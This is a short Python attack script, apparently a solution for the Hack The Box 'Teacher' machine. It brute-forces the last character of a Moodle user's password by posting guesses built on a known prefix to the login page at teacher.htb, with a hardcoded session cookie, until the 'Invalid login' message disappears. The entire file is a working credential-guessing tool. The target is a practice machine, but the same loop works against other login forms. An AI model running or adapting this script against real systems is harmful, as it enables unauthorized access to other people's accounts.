#!/usr/bin/python3
import requests
import string
import sys
from pwn import log

def bruteforce_login()->None:
    username: str = "Giovanni"
    base_password: str = 'Th4C00lTheacha'
    url: str = "http://teacher.htb:80/moodle/login/index.php"
    cookies = {"MoodleSession": "8fa8tmkgtc3ddmf9kcr9451gc0"}
    headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
                     "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
                     "Accept-Language": "en-US,en;q=0.5", 
                     "Accept-Encoding": "gzip, deflate, br", 
                     "Content-Type": "application/x-www-form-urlencoded", 
                     "Origin": "http://teacher.htb", 
                     "DNT": "1", 
                     "Connection": "close", 
                     "Referer": "http://teacher.htb/moodle/login/index.php", 
                     "Upgrade-Insecure-Requests": "1"}
    p = log.progress("Bruteforcing password")
    for char in list(string.ascii_letters + string.digits + string.punctuation):
        p.status(f"Attempting with password {base_password + char!r}")
        data = {"anchor": '', "username": username, "password": base_password + char}
        r = requests.post(url, headers=headers, cookies=cookies, data=data)
        if r.status_code != 200:
            p.failure(f"Invalid status code ({r.status_code})")
            sys.exit(1)
        if not 'Invalid login' in r.text:
            p.success(f"Password found: {base_password + char}")
            return
    else:
        p.failure("List exhausted. Password not found")


def main()->None:
    bruteforce_login()


if __name__ == "__main__":
    main()
